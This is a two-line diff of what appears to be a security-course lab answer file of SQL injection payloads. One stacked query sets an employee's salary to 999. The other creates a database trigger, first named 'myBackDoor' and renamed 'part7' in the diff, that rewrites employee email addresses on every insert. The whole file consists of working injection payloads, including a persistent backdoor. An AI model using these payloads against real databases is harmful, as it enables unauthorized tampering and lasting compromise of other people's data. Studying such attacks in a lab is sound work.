@@ -1,2 +1,2 @@
 101; update employee set salary=999 where userid=101
-101; create trigger myBackDoor before insert on employee for each row begin update employee set email='ece568_24s@utoronto.ca' where userid = NEW.userid
+101; CREATE TRIGGER part7 BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='ece568_24s@utoronto.ca' WHERE userid = NEW.userid
